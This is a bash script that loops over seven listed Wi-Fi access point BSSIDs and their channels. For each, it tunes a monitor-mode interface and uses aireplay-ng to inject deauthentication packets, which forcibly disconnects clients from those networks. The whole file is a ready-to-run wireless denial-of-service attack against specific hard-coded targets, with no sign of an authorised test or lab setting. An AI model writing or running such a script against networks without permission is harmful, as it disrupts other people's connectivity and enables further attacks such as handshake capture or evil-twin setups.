#!/bin/bash

# List of BSSIDs and their corresponding channels (separated by space)
declare -A targets=(
    ["D8:D8:66:4F:D8:F4"]="11"
    ["5E:A0:00:D6:16:40"]="11"
    ["7C:76:68:92:4D:F4"]="10"
    ["CE:7A:AD:5A:44:59"]="6"
    ["90:61:0C:5B:2D:FD"]="7"
    ["D8:D8:66:4F:B6:E0"]="7"
    ["CE:0A:18:46:56:A8"]="6"
)

# Interface in monitor mode
INTERFACE="wlp3s0"

# Number of deauth packets to send per BSSID
PACKETS=10

# Loop through all BSSIDs and channels
for BSSID in "${!targets[@]}"; do
    CHANNEL=${targets[$BSSID]}

    echo "Switching to channel $CHANNEL for BSSID $BSSID"
    
    # Set the interface to the correct channel
    sudo iwconfig $INTERFACE channel $CHANNEL

    # Inject deauth packets
    echo "Injecting $PACKETS packets on $BSSID"
    sudo aireplay-ng --deauth $PACKETS -a $BSSID $INTERFACE

    # Wait 5 seconds before switching to the next target (optional)
    sleep 5
done

echo "Packet injection completed."
